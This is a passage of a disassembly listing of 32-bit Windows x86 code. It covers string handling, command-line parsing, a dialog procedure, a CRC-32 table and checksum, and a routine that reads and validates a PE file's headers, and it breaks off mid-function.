 1002be8:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
 1002bea:	8b c8                	mov    %eax,%ecx
 1002bec:	83 e1 03             	and    $0x3,%ecx
 1002bef:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
 1002bf1:	80 7a ff 5c          	cmpb   $0x5c,-0x1(%edx)
 1002bf5:	74 04                	je     0x1002bfb
 1002bf7:	c6 02 5c             	movb   $0x5c,(%edx)
 1002bfa:	42                   	inc    %edx
 1002bfb:	8b 45 0c             	mov    0xc(%ebp),%eax
 1002bfe:	8d 70 01             	lea    0x1(%eax),%esi
 1002c01:	8a 08                	mov    (%eax),%cl
 1002c03:	40                   	inc    %eax
 1002c04:	84 c9                	test   %cl,%cl
 1002c06:	75 f9                	jne    0x1002c01
 1002c08:	2b c6                	sub    %esi,%eax
 1002c0a:	8b 75 0c             	mov    0xc(%ebp),%esi
 1002c0d:	8d 48 01             	lea    0x1(%eax),%ecx
 1002c10:	8b d9                	mov    %ecx,%ebx
 1002c12:	c1 e9 02             	shr    $0x2,%ecx
 1002c15:	8b fa                	mov    %edx,%edi
 1002c17:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
 1002c19:	8b cb                	mov    %ebx,%ecx
 1002c1b:	83 e1 03             	and    $0x3,%ecx
 1002c1e:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
 1002c20:	5f                   	pop    %edi
 1002c21:	5e                   	pop    %esi
 1002c22:	03 c2                	add    %edx,%eax
 1002c24:	5b                   	pop    %ebx
 1002c25:	5d                   	pop    %ebp
 1002c26:	c2 0c 00             	ret    $0xc
 1002c29:	cc                   	int3
 1002c2a:	cc                   	int3
 1002c2b:	cc                   	int3
 1002c2c:	cc                   	int3
 1002c2d:	cc                   	int3
 1002c2e:	8b ff                	mov    %edi,%edi
 1002c30:	55                   	push   %ebp
 1002c31:	8b ec                	mov    %esp,%ebp
 1002c33:	ff 75 08             	push   0x8(%ebp)
 1002c36:	6a 00                	push   $0x0
 1002c38:	ff 35 78 d0 00 01    	push   0x100d078
 1002c3e:	ff 15 e4 20 00 01    	call   *0x10020e4
 1002c44:	5d                   	pop    %ebp
 1002c45:	c3                   	ret
 1002c46:	cc                   	int3
 1002c47:	cc                   	int3
 1002c48:	cc                   	int3
 1002c49:	cc                   	int3
 1002c4a:	cc                   	int3
 1002c4b:	8b ff                	mov    %edi,%edi
 1002c4d:	55                   	push   %ebp
 1002c4e:	8b ec                	mov    %esp,%ebp
 1002c50:	56                   	push   %esi
 1002c51:	8b 75 08             	mov    0x8(%ebp),%esi
 1002c54:	81 fe ed fe da da    	cmp    $0xdadafeed,%esi
 1002c5a:	74 16                	je     0x1002c72
 1002c5c:	56                   	push   %esi
 1002c5d:	ff 15 d4 20 00 01    	call   *0x10020d4
 1002c63:	39 35 a4 c4 00 01    	cmp    %esi,0x100c4a4
 1002c69:	75 07                	jne    0x1002c72
 1002c6b:	83 25 a4 c4 00 01 00 	andl   $0x0,0x100c4a4
 1002c72:	33 c0                	xor    %eax,%eax
 1002c74:	5e                   	pop    %esi
 1002c75:	5d                   	pop    %ebp
 1002c76:	c3                   	ret
 1002c77:	cc                   	int3
 1002c78:	cc                   	int3
 1002c79:	cc                   	int3
 1002c7a:	cc                   	int3
 1002c7b:	cc                   	int3
 1002c7c:	8b ff                	mov    %edi,%edi
 1002c7e:	55                   	push   %ebp
 1002c7f:	8b ec                	mov    %esp,%ebp
 1002c81:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
 1002c85:	8b 45 0c             	mov    0xc(%ebp),%eax
 1002c88:	75 08                	jne    0x1002c92
 1002c8a:	8b 0d 18 c0 00 01    	mov    0x100c018,%ecx
 1002c90:	03 c1                	add    %ecx,%eax
 1002c92:	ff 75 10             	push   0x10(%ebp)
 1002c95:	6a 00                	push   $0x0
 1002c97:	50                   	push   %eax
 1002c98:	ff 75 08             	push   0x8(%ebp)
 1002c9b:	ff 15 a8 20 00 01    	call   *0x10020a8
 1002ca1:	2b 05 18 c0 00 01    	sub    0x100c018,%eax
 1002ca7:	5d                   	pop    %ebp
 1002ca8:	c3                   	ret
 1002ca9:	cc                   	int3
 1002caa:	cc                   	int3
 1002cab:	cc                   	int3
 1002cac:	cc                   	int3
 1002cad:	cc                   	int3
 1002cae:	8b ff                	mov    %edi,%edi
 1002cb0:	55                   	push   %ebp
 1002cb1:	8b ec                	mov    %esp,%ebp
 1002cb3:	83 ec 10             	sub    $0x10,%esp
 1002cb6:	a1 28 c0 00 01       	mov    0x100c028,%eax
 1002cbb:	89 45 fc             	mov    %eax,-0x4(%ebp)
 1002cbe:	8b 45 08             	mov    0x8(%ebp),%eax
 1002cc1:	85 c0                	test   %eax,%eax
 1002cc3:	56                   	push   %esi
 1002cc4:	8b 75 0c             	mov    0xc(%ebp),%esi
 1002cc7:	8d 4d f0             	lea    -0x10(%ebp),%ecx
 1002cca:	75 06                	jne    0x1002cd2
 1002ccc:	c6 06 30             	movb   $0x30,(%esi)
 1002ccf:	46                   	inc    %esi
 1002cd0:	eb 22                	jmp    0x1002cf4
 1002cd2:	57                   	push   %edi
 1002cd3:	33 d2                	xor    %edx,%edx
 1002cd5:	6a 0a                	push   $0xa
 1002cd7:	5f                   	pop    %edi
 1002cd8:	f7 f7                	div    %edi
 1002cda:	80 c2 30             	add    $0x30,%dl
 1002cdd:	88 11                	mov    %dl,(%ecx)
 1002cdf:	41                   	inc    %ecx
 1002ce0:	85 c0                	test   %eax,%eax
 1002ce2:	75 ef                	jne    0x1002cd3
 1002ce4:	5f                   	pop    %edi
 1002ce5:	eb 05                	jmp    0x1002cec
 1002ce7:	8a 01                	mov    (%ecx),%al
 1002ce9:	88 06                	mov    %al,(%esi)
 1002ceb:	46                   	inc    %esi
 1002cec:	49                   	dec    %ecx
 1002ced:	8d 45 f0             	lea    -0x10(%ebp),%eax
 1002cf0:	3b c8                	cmp    %eax,%ecx
 1002cf2:	73 f3                	jae    0x1002ce7
 1002cf4:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 1002cf7:	c6 06 00             	movb   $0x0,(%esi)
 1002cfa:	5e                   	pop    %esi
 1002cfb:	e8 ff 35 00 00       	call   0x10062ff
 1002d00:	c9                   	leave
 1002d01:	c2 08 00             	ret    $0x8
 1002d04:	cc                   	int3
 1002d05:	cc                   	int3
 1002d06:	cc                   	int3
 1002d07:	cc                   	int3
 1002d08:	cc                   	int3
 1002d09:	8b ff                	mov    %edi,%edi
 1002d0b:	55                   	push   %ebp
 1002d0c:	8b ec                	mov    %esp,%ebp
 1002d0e:	83 ec 0c             	sub    $0xc,%esp
 1002d11:	56                   	push   %esi
 1002d12:	8b 75 08             	mov    0x8(%ebp),%esi
 1002d15:	f7 c6 00 00 00 20    	test   $0x20000000,%esi
 1002d1b:	74 17                	je     0x1002d34
 1002d1d:	ff 75 0c             	push   0xc(%ebp)
 1002d20:	ff 75 10             	push   0x10(%ebp)
 1002d23:	56                   	push   %esi
 1002d24:	ff 35 5c c0 00 01    	push   0x100c05c
 1002d2a:	ff 15 80 21 00 01    	call   *0x1002180
 1002d30:	85 c0                	test   %eax,%eax
 1002d32:	75 3a                	jne    0x1002d6e
 1002d34:	a1 0c ce 00 01       	mov    0x100ce0c,%eax
 1002d39:	89 45 f4             	mov    %eax,-0xc(%ebp)
 1002d3c:	b8 bb 22 00 01       	mov    $0x10022bb,%eax
 1002d41:	89 45 f8             	mov    %eax,-0x8(%ebp)
 1002d44:	89 45 fc             	mov    %eax,-0x4(%ebp)
 1002d47:	8d 45 f4             	lea    -0xc(%ebp),%eax
 1002d4a:	50                   	push   %eax
 1002d4b:	ff 75 0c             	push   0xc(%ebp)
 1002d4e:	ff 75 10             	push   0x10(%ebp)
 1002d51:	6a 00                	push   $0x0
 1002d53:	56                   	push   %esi
 1002d54:	6a 00                	push   $0x0
 1002d56:	68 00 30 00 00       	push   $0x3000
 1002d5b:	ff 15 e8 20 00 01    	call   *0x10020e8
 1002d61:	85 c0                	test   %eax,%eax
 1002d63:	75 09                	jne    0x1002d6e
 1002d65:	ff 75 10             	push   0x10(%ebp)
 1002d68:	56                   	push   %esi
 1002d69:	e8 40 ff ff ff       	call   0x1002cae
 1002d6e:	5e                   	pop    %esi
 1002d6f:	c9                   	leave
 1002d70:	c2 0c 00             	ret    $0xc
 1002d73:	cc                   	int3
 1002d74:	cc                   	int3
 1002d75:	cc                   	int3
 1002d76:	cc                   	int3
 1002d77:	cc                   	int3
 1002d78:	8b ff                	mov    %edi,%edi
 1002d7a:	53                   	push   %ebx
 1002d7b:	56                   	push   %esi
 1002d7c:	57                   	push   %edi
 1002d7d:	68 60 d0 00 01       	push   $0x100d060
 1002d82:	ff 15 f4 20 00 01    	call   *0x10020f4
 1002d88:	a1 a4 c4 00 01       	mov    0x100c4a4,%eax
 1002d8d:	85 c0                	test   %eax,%eax
 1002d8f:	8b 35 d4 20 00 01    	mov    0x10020d4,%esi
 1002d95:	74 0a                	je     0x1002da1
 1002d97:	50                   	push   %eax
 1002d98:	ff d6                	call   *%esi
 1002d9a:	83 25 a4 c4 00 01 00 	andl   $0x0,0x100c4a4
 1002da1:	a1 20 c0 00 01       	mov    0x100c020,%eax
 1002da6:	83 f8 ff             	cmp    $0xffffffff,%eax
 1002da9:	74 0a                	je     0x1002db5
 1002dab:	50                   	push   %eax
 1002dac:	ff d6                	call   *%esi
 1002dae:	83 0d 20 c0 00 01 ff 	orl    $0xffffffff,0x100c020
 1002db5:	8b 35 04 c0 00 01    	mov    0x100c004,%esi
 1002dbb:	8b 1d ac 20 00 01    	mov    0x10020ac,%ebx
 1002dc1:	bf 04 c0 00 01       	mov    $0x100c004,%edi
 1002dc6:	eb 31                	jmp    0x1002df9
 1002dc8:	8b 46 04             	mov    0x4(%esi),%eax
 1002dcb:	85 c0                	test   %eax,%eax
 1002dcd:	74 28                	je     0x1002df7
 1002dcf:	50                   	push   %eax
 1002dd0:	ff 15 f0 20 00 01    	call   *0x10020f0
 1002dd6:	85 c0                	test   %eax,%eax
 1002dd8:	75 19                	jne    0x1002df3
 1002dda:	ff 15 b4 20 00 01    	call   *0x10020b4
 1002de0:	83 f8 02             	cmp    $0x2,%eax
 1002de3:	74 0e                	je     0x1002df3
 1002de5:	83 f8 03             	cmp    $0x3,%eax
 1002de8:	74 09                	je     0x1002df3
 1002dea:	6a 04                	push   $0x4
 1002dec:	6a 00                	push   $0x0
 1002dee:	ff 76 04             	push   0x4(%esi)
 1002df1:	ff d3                	call   *%ebx
 1002df3:	83 66 04 00          	andl   $0x0,0x4(%esi)
 1002df7:	8b 36                	mov    (%esi),%esi
 1002df9:	3b f7                	cmp    %edi,%esi
 1002dfb:	75 cb                	jne    0x1002dc8
 1002dfd:	8b 35 0c c0 00 01    	mov    0x100c00c,%esi
 1002e03:	bf 0c c0 00 01       	mov    $0x100c00c,%edi
 1002e08:	eb 31                	jmp    0x1002e3b
 1002e0a:	8b 46 04             	mov    0x4(%esi),%eax
 1002e0d:	85 c0                	test   %eax,%eax
 1002e0f:	74 28                	je     0x1002e39
 1002e11:	50                   	push   %eax
 1002e12:	ff 15 b0 20 00 01    	call   *0x10020b0
 1002e18:	85 c0                	test   %eax,%eax
 1002e1a:	75 19                	jne    0x1002e35
 1002e1c:	ff 15 b4 20 00 01    	call   *0x10020b4
 1002e22:	83 f8 02             	cmp    $0x2,%eax
 1002e25:	74 0e                	je     0x1002e35
 1002e27:	83 f8 03             	cmp    $0x3,%eax
 1002e2a:	74 09                	je     0x1002e35
 1002e2c:	6a 04                	push   $0x4
 1002e2e:	6a 00                	push   $0x0
 1002e30:	ff 76 04             	push   0x4(%esi)
 1002e33:	ff d3                	call   *%ebx
 1002e35:	83 66 04 00          	andl   $0x0,0x4(%esi)
 1002e39:	8b 36                	mov    (%esi),%esi
 1002e3b:	3b f7                	cmp    %edi,%esi
 1002e3d:	75 cb                	jne    0x1002e0a
 1002e3f:	68 60 d0 00 01       	push   $0x100d060
 1002e44:	ff 15 ec 20 00 01    	call   *0x10020ec
 1002e4a:	5f                   	pop    %edi
 1002e4b:	5e                   	pop    %esi
 1002e4c:	5b                   	pop    %ebx
 1002e4d:	c3                   	ret
 1002e4e:	cc                   	int3
 1002e4f:	cc                   	int3
 1002e50:	cc                   	int3
 1002e51:	cc                   	int3
 1002e52:	cc                   	int3
 1002e53:	8b ff                	mov    %edi,%edi
 1002e55:	55                   	push   %ebp
 1002e56:	8b ec                	mov    %esp,%ebp
 1002e58:	51                   	push   %ecx
 1002e59:	51                   	push   %ecx
 1002e5a:	83 7d 0c 10          	cmpl   $0x10,0xc(%ebp)
 1002e5e:	56                   	push   %esi
 1002e5f:	0f 84 b6 00 00 00    	je     0x1002f1b
 1002e65:	83 7d 0c 16          	cmpl   $0x16,0xc(%ebp)
 1002e69:	74 45                	je     0x1002eb0
 1002e6b:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
 1002e72:	0f 85 9f 00 00 00    	jne    0x1002f17
 1002e78:	83 3d b4 c4 00 01 00 	cmpl   $0x0,0x100c4b4
 1002e7f:	8b 45 08             	mov    0x8(%ebp),%eax
 1002e82:	a3 04 ce 00 01       	mov    %eax,0x100ce04
 1002e87:	74 19                	je     0x1002ea2
 1002e89:	6a fd                	push   $0xfffffffd
 1002e8b:	50                   	push   %eax
 1002e8c:	ff 15 78 21 00 01    	call   *0x1002178
 1002e92:	68 f4 01 00 00       	push   $0x1f4
 1002e97:	a3 28 cf 00 01       	mov    %eax,0x100cf28
 1002e9c:	ff 15 08 21 00 01    	call   *0x1002108
 1002ea2:	ff 35 2c cf 00 01    	push   0x100cf2c
 1002ea8:	ff 15 9c 20 00 01    	call   *0x100209c
 1002eae:	eb 7d                	jmp    0x1002f2d
 1002eb0:	33 f6                	xor    %esi,%esi
 1002eb2:	39 75 10             	cmp    %esi,0x10(%ebp)
 1002eb5:	74 60                	je     0x1002f17
 1002eb7:	ff 35 24 cf 00 01    	push   0x100cf24
 1002ebd:	ff 15 9c 20 00 01    	call   *0x100209c
 1002ec3:	68 bc 22 00 01       	push   $0x10022bc
 1002ec8:	56                   	push   %esi
 1002ec9:	6a 01                	push   $0x1
 1002ecb:	56                   	push   %esi
 1002ecc:	ff 15 00 21 00 01    	call   *0x1002100
 1002ed2:	89 45 f8             	mov    %eax,-0x8(%ebp)
 1002ed5:	39 75 f8             	cmp    %esi,-0x8(%ebp)
 1002ed8:	a1 4c d0 00 01       	mov    0x100d04c,%eax
 1002edd:	89 45 fc             	mov    %eax,-0x4(%ebp)
 1002ee0:	74 1c                	je     0x1002efe
 1002ee2:	3b c6                	cmp    %esi,%eax
 1002ee4:	74 18                	je     0x1002efe
 1002ee6:	6a ff                	push   $0xffffffff
 1002ee8:	56                   	push   %esi
 1002ee9:	8d 45 f8             	lea    -0x8(%ebp),%eax
 1002eec:	50                   	push   %eax
 1002eed:	6a 02                	push   $0x2
 1002eef:	ff 15 fc 20 00 01    	call   *0x10020fc
 1002ef5:	ff 75 f8             	push   -0x8(%ebp)
 1002ef8:	ff 15 d4 20 00 01    	call   *0x10020d4
 1002efe:	e8 75 fe ff ff       	call   0x1002d78
 1002f03:	a1 4c d0 00 01       	mov    0x100d04c,%eax
 1002f08:	3b c6                	cmp    %esi,%eax
 1002f0a:	74 21                	je     0x1002f2d
 1002f0c:	6a 01                	push   $0x1
 1002f0e:	50                   	push   %eax
 1002f0f:	ff 15 f8 20 00 01    	call   *0x10020f8
 1002f15:	eb 16                	jmp    0x1002f2d
 1002f17:	33 c0                	xor    %eax,%eax
 1002f19:	eb 15                	jmp    0x1002f30
 1002f1b:	33 f6                	xor    %esi,%esi
 1002f1d:	56                   	push   %esi
 1002f1e:	ff 75 08             	push   0x8(%ebp)
 1002f21:	89 35 04 ce 00 01    	mov    %esi,0x100ce04
 1002f27:	ff 15 7c 21 00 01    	call   *0x100217c
 1002f2d:	33 c0                	xor    %eax,%eax
 1002f2f:	40                   	inc    %eax
 1002f30:	5e                   	pop    %esi
 1002f31:	c9                   	leave
 1002f32:	c2 10 00             	ret    $0x10
 1002f35:	cc                   	int3
 1002f36:	cc                   	int3
 1002f37:	cc                   	int3
 1002f38:	cc                   	int3
 1002f39:	cc                   	int3
 1002f3a:	8b ff                	mov    %edi,%edi
 1002f3c:	55                   	push   %ebp
 1002f3d:	8b ec                	mov    %esp,%ebp
 1002f3f:	8b 45 08             	mov    0x8(%ebp),%eax
 1002f42:	56                   	push   %esi
 1002f43:	be 80 d0 00 01       	mov    $0x100d080,%esi
 1002f48:	8a 08                	mov    (%eax),%cl
 1002f4a:	80 f9 20             	cmp    $0x20,%cl
 1002f4d:	74 05                	je     0x1002f54
 1002f4f:	80 f9 09             	cmp    $0x9,%cl
 1002f52:	75 03                	jne    0x1002f57
 1002f54:	40                   	inc    %eax
 1002f55:	eb f1                	jmp    0x1002f48
 1002f57:	8b c8                	mov    %eax,%ecx
 1002f59:	57                   	push   %edi
 1002f5a:	8d 79 01             	lea    0x1(%ecx),%edi
 1002f5d:	8a 11                	mov    (%ecx),%dl
 1002f5f:	41                   	inc    %ecx
 1002f60:	84 d2                	test   %dl,%dl
 1002f62:	75 f9                	jne    0x1002f5d
 1002f64:	2b cf                	sub    %edi,%ecx
 1002f66:	41                   	inc    %ecx
 1002f67:	81 f9 04 01 00 00    	cmp    $0x104,%ecx
 1002f6d:	5f                   	pop    %edi
 1002f6e:	72 04                	jb     0x1002f74
 1002f70:	33 c0                	xor    %eax,%eax
 1002f72:	eb 34                	jmp    0x1002fa8
 1002f74:	8a 08                	mov    (%eax),%cl
 1002f76:	80 f9 22             	cmp    $0x22,%cl
 1002f79:	75 23                	jne    0x1002f9e
 1002f7b:	eb 08                	jmp    0x1002f85
 1002f7d:	80 f9 22             	cmp    $0x22,%cl
 1002f80:	74 20                	je     0x1002fa2
 1002f82:	88 0e                	mov    %cl,(%esi)
 1002f84:	46                   	inc    %esi
 1002f85:	40                   	inc    %eax
 1002f86:	8a 08                	mov    (%eax),%cl
 1002f88:	84 c9                	test   %cl,%cl
 1002f8a:	75 f1                	jne    0x1002f7d
 1002f8c:	eb 14                	jmp    0x1002fa2
 1002f8e:	80 f9 20             	cmp    $0x20,%cl
 1002f91:	74 0f                	je     0x1002fa2
 1002f93:	80 f9 09             	cmp    $0x9,%cl
 1002f96:	74 0a                	je     0x1002fa2
 1002f98:	88 0e                	mov    %cl,(%esi)
 1002f9a:	46                   	inc    %esi
 1002f9b:	40                   	inc    %eax
 1002f9c:	8a 08                	mov    (%eax),%cl
 1002f9e:	84 c9                	test   %cl,%cl
 1002fa0:	75 ec                	jne    0x1002f8e
 1002fa2:	33 c0                	xor    %eax,%eax
 1002fa4:	c6 06 00             	movb   $0x0,(%esi)
 1002fa7:	40                   	inc    %eax
 1002fa8:	5e                   	pop    %esi
 1002fa9:	5d                   	pop    %ebp
 1002faa:	c2 04 00             	ret    $0x4
 1002fad:	cc                   	int3
 1002fae:	cc                   	int3
 1002faf:	cc                   	int3
 1002fb0:	cc                   	int3
 1002fb1:	cc                   	int3
 1002fb2:	33 c9                	xor    %ecx,%ecx
 1002fb4:	6a 08                	push   $0x8
 1002fb6:	8b c1                	mov    %ecx,%eax
 1002fb8:	5a                   	pop    %edx
 1002fb9:	a8 01                	test   $0x1,%al
 1002fbb:	74 09                	je     0x1002fc6
 1002fbd:	d1 e8                	shr    $1,%eax
 1002fbf:	35 20 83 b8 ed       	xor    $0xedb88320,%eax
 1002fc4:	eb 02                	jmp    0x1002fc8
 1002fc6:	d1 e8                	shr    $1,%eax
 1002fc8:	4a                   	dec    %edx
 1002fc9:	75 ee                	jne    0x1002fb9
 1002fcb:	89 04 8d c0 c4 00 01 	mov    %eax,0x100c4c0(,%ecx,4)
 1002fd2:	41                   	inc    %ecx
 1002fd3:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
 1002fd9:	72 d9                	jb     0x1002fb4
 1002fdb:	c3                   	ret
 1002fdc:	cc                   	int3
 1002fdd:	cc                   	int3
 1002fde:	cc                   	int3
 1002fdf:	cc                   	int3
 1002fe0:	cc                   	int3
 1002fe1:	8b ff                	mov    %edi,%edi
 1002fe3:	55                   	push   %ebp
 1002fe4:	8b ec                	mov    %esp,%ebp
 1002fe6:	8b 55 10             	mov    0x10(%ebp),%edx
 1002fe9:	85 d2                	test   %edx,%edx
 1002feb:	8b 45 08             	mov    0x8(%ebp),%eax
 1002fee:	8b 4d 0c             	mov    0xc(%ebp),%ecx
 1002ff1:	74 1a                	je     0x100300d
 1002ff3:	56                   	push   %esi
 1002ff4:	57                   	push   %edi
 1002ff5:	0f b6 31             	movzbl (%ecx),%esi
 1002ff8:	0f b6 f8             	movzbl %al,%edi
 1002ffb:	33 f7                	xor    %edi,%esi
 1002ffd:	c1 e8 08             	shr    $0x8,%eax
 1003000:	33 04 b5 c0 c4 00 01 	xor    0x100c4c0(,%esi,4),%eax
 1003007:	41                   	inc    %ecx
 1003008:	4a                   	dec    %edx
 1003009:	75 ea                	jne    0x1002ff5
 100300b:	5f                   	pop    %edi
 100300c:	5e                   	pop    %esi
 100300d:	5d                   	pop    %ebp
 100300e:	c2 0c 00             	ret    $0xc
 1003011:	cc                   	int3
 1003012:	cc                   	int3
 1003013:	cc                   	int3
 1003014:	cc                   	int3
 1003015:	cc                   	int3
 1003016:	8b ff                	mov    %edi,%edi
 1003018:	55                   	push   %ebp
 1003019:	8b ec                	mov    %esp,%ebp
 100301b:	81 ec 1c 01 00 00    	sub    $0x11c,%esp
 1003021:	a1 28 c0 00 01       	mov    0x100c028,%eax
 1003026:	53                   	push   %ebx
 1003027:	33 db                	xor    %ebx,%ebx
 1003029:	53                   	push   %ebx
 100302a:	68 00 00 00 10       	push   $0x10000000
 100302f:	6a 03                	push   $0x3
 1003031:	53                   	push   %ebx
 1003032:	6a 03                	push   $0x3
 1003034:	89 45 fc             	mov    %eax,-0x4(%ebp)
 1003037:	8b 45 08             	mov    0x8(%ebp),%eax
 100303a:	68 00 00 00 80       	push   $0x80000000
 100303f:	50                   	push   %eax
 1003040:	ff 15 dc 20 00 01    	call   *0x10020dc
 1003046:	83 f8 ff             	cmp    $0xffffffff,%eax
 1003049:	89 85 f4 fe ff ff    	mov    %eax,-0x10c(%ebp)
 100304f:	0f 84 74 03 00 00    	je     0x10033c9
 1003055:	56                   	push   %esi
 1003056:	57                   	push   %edi
 1003057:	8b 3d a4 20 00 01    	mov    0x10020a4,%edi
 100305d:	53                   	push   %ebx
 100305e:	8d 8d 00 ff ff ff    	lea    -0x100(%ebp),%ecx
 1003064:	51                   	push   %ecx
 1003065:	be f8 00 00 00       	mov    $0xf8,%esi
 100306a:	56                   	push   %esi
 100306b:	8d 8d 04 ff ff ff    	lea    -0xfc(%ebp),%ecx
 1003071:	51                   	push   %ecx
 1003072:	50                   	push   %eax
 1003073:	ff d7                	call   *%edi
 1003075:	85 c0                	test   %eax,%eax
 1003077:	0f 84 3e 03 00 00    	je     0x10033bb
 100307d:	39 b5 00 ff ff ff    	cmp    %esi,-0x100(%ebp)
 1003083:	0f 85 32 03 00 00    	jne    0x10033bb
 1003089:	66 81 bd 04 ff ff ff 	cmpw   $0x5a4d,-0xfc(%ebp)
 1003090:	4d 5a 
 1003092:	75 4c                	jne    0x10030e0
 1003094:	53                   	push   %ebx
 1003095:	53                   	push   %ebx
 1003096:	ff b5 40 ff ff ff    	push   -0xc0(%ebp)
 100309c:	ff b5 f4 fe ff ff    	push   -0x10c(%ebp)
 10030a2:	ff 15 a8 20 00 01    	call   *0x10020a8
 10030a8:	3b 85 40 ff ff ff    	cmp    -0xc0(%ebp),%eax
 10030ae:	0f 85 07 03 00 00    	jne    0x10033bb
 10030b4:	53                   	push   %ebx
 10030b5:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
 10030bb:	50                   	push   %eax
 10030bc:	56                   	push   %esi
 10030bd:	8d 85 04 ff ff ff    	lea    -0xfc(%ebp),%eax
 10030c3:	50                   	push   %eax
 10030c4:	ff b5 f4 fe ff ff    	push   -0x10c(%ebp)
 10030ca:	ff d7                	call   *%edi
 10030cc:	85 c0                	test   %eax,%eax
 10030ce:	0f 84 e7 02 00 00    	je     0x10033bb
 10030d4:	39 b5 00 ff ff ff    	cmp    %esi,-0x100(%ebp)
 10030da:	0f 85 db 02 00 00    	jne    0x10033bb
 10030e0:	81 bd 04 ff ff ff 50 	cmpl   $0x4550,-0xfc(%ebp)
 10030e7:	45 00 00 
 10030ea:	0f 85 cb 02 00 00    	jne    0x10033bb
 10030f0:	66 81 bd 18 ff ff ff 	cmpw   $0xe0,-0xe8(%ebp)
 10030f7:	e0 00 
 10030f9:	0f 82 bc 02 00 00    	jb     0x10033bb
 10030ff:	39 5d 9c             	cmp    %ebx,-0x64(%ebp)
 1003102:	0f 84 b3 02 00 00    	je     0x10033bb
 1003108:	39 5d a0             	cmp    %ebx,-0x60(%ebp)
 100310b:	0f 84 aa 02 00 00    	je     0x10033bb
 1003111:	81 7d a0 00 00 04 00 	cmpl   $0x40000,-0x60(%ebp)
 1003118:	0f 87 9d 02 00 00    	ja     0x10033bb
 100311e:	ff 75 a0             	push   -0x60(%ebp)
 1003121:	6a 08                	push   $0x8
 1003123:	ff 35 78 d0 00 01    	push   0x100d078
 1003129:	ff 15 18 21 00 01    	call   *0x1002118
 100312f:	8b f0                	mov    %eax,%esi
 1003131:	3b f3                	cmp    %ebx,%esi
 1003133:	89 b5 ec fe ff ff    	mov    %esi,-0x114(%ebp)
 1003139:	0f 84 7c 02 00 00    	je     0x10033bb
 100313f:	53                   	push   %ebx
 1003140:	53                   	push   %ebx
 1003141:	ff 75 9c             	push   -0x64(%ebp)
 1003144:	ff b5 f4 fe ff ff    	push   -0x10c(%ebp)
 100314a:	ff 15 a8 20 00 01    	call   *0x10020a8
 1003150:	3b 45 9c             	cmp    -0x64(%ebp),%eax
 1003153:	0f 85 62 02 00 00    	jne    0x10033bb
 1003159:	53                   	push   %ebx
 100315a:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
 1003160:	50                   	push   %eax
 1003161:	ff 75 a0             	push   -0x60(%ebp)
 1003164:	56                   	push   %esi
 1003165:	ff b5 f4 fe ff ff    	push   -0x10c(%ebp)
 100316b:	ff d7                	call   *%edi
 100316d:	85 c0                	test   %eax,%eax
 100316f:	0f 84 46 02 00 00    	je     0x10033bb
 1003175:	8b 4d a0             	mov    -0x60(%ebp),%ecx
 1003178:	39 8d 00 ff ff ff    	cmp    %ecx,-0x100(%ebp)
 100317e:	0f 85 37 02 00 00    	jne    0x10033bb
 1003184:	8b c6                	mov    %esi,%eax
 1003186:	89 8d fc fe ff ff    	mov    %ecx,-0x104(%ebp)
 100318c:	83 f9 16             	cmp    $0x16,%ecx
 100318f:	eb 4c                	jmp    0x10031dd
 1003191:	80 38 c0             	cmpb   $0xc0,(%eax)
 1003194:	75 39                	jne    0x10031cf
 1003196:	6a 04                	push   $0x4
 1003198:	59                   	pop    %ecx
 1003199:	bf 3c 22 00 01       	mov    $0x100223c,%edi
 100319e:	8b f0                	mov    %eax,%esi
 10031a0:	33 d2                	xor    %edx,%edx
 10031a2:	f3 a7                	repz cmpsl %es:(%edi),%ds:(%esi)
 10031a4:	75 29                	jne    0x10031cf
 10031a6:	8b 48 10             	mov    0x10(%eax),%ecx
 10031a9:	83 f9 16             	cmp    $0x16,%ecx
 10031ac:	89 8d 00 ff ff ff    	mov    %ecx,-0x100(%ebp)
 10031b2:	72 1b                	jb     0x10031cf
 10031b4:	3b 8d fc fe ff ff    	cmp    -0x104(%ebp),%ecx
 10031ba:	77 13                	ja     0x10031cf
 10031bc:	51                   	push   %ecx
 10031bd:	50                   	push   %eax
 10031be:	6a ff                	push   $0xffffffff
 10031c0:	e8 1c fe ff ff       	call   0x1002fe1
 10031c5:	85 c0                	test   %eax,%eax
 10031c7:	74 21                	je     0x10031ea
 10031c9:	8b 85 f8 fe ff ff    	mov    -0x108(%ebp),%eax
 10031cf:	40                   	inc    %eax
 10031d0:	ff 8d fc fe ff ff    	decl   -0x104(%ebp)
 10031d6:	83 bd fc fe ff ff 16 	cmpl   $0x16,-0x104(%ebp)
 10031dd:	89 85 f8 fe ff ff    	mov    %eax,-0x108(%ebp)
 10031e3:	73 ac                	jae    0x1003191
 10031e5:	e9 d1 01 00 00       	jmp    0x10033bb
 10031ea:	8b 8d f8 fe ff ff    	mov    -0x108(%ebp),%ecx
 10031f0:	f6 c1 03             	test   $0x3,%cl
 10031f3:	74 2c                	je     0x1003221
 10031f5:	8b bd ec fe ff ff    	mov    -0x114(%ebp),%edi
 10031fb:	8b f7                	mov    %edi,%esi
 10031fd:	eb 0c                	jmp    0x100320b
 10031ff:	ff 8d 00 ff ff ff    	decl   -0x100(%ebp)
 1003205:	8a 01                	mov    (%ecx),%al
 1003207:	88 06                	mov    %al,(%esi)
 1003209:	46                   	inc    %esi
 100320a:	41                   	inc    %ecx
 100320b:	39 9d 00 ff ff ff    	cmp    %ebx,-0x100(%ebp)
 1003211:	75 ec                	jne    0x10031ff
 1003213:	ff 8d 00 ff ff ff    	decl   -0x100(%ebp)
 1003219:	89 bd f8 fe ff ff    	mov    %edi,-0x108(%ebp)
 100321f:	8b cf                	mov    %edi,%ecx
 1003221:	0f b7 51 14          	movzwl 0x14(%ecx),%edx
 1003225:	8b 41 10             	mov    0x10(%ecx),%eax
 1003228:	03 c1                	add    %ecx,%eax
 100322a:	83 c1 16             	add    $0x16,%ecx
 100322d:	3b d3                	cmp    %ebx,%edx
 100322f:	89 95 ec fe ff ff    	mov    %edx,-0x114(%ebp)
 1003235:	89 85 e4 fe ff ff    	mov    %eax,-0x11c(%ebp)
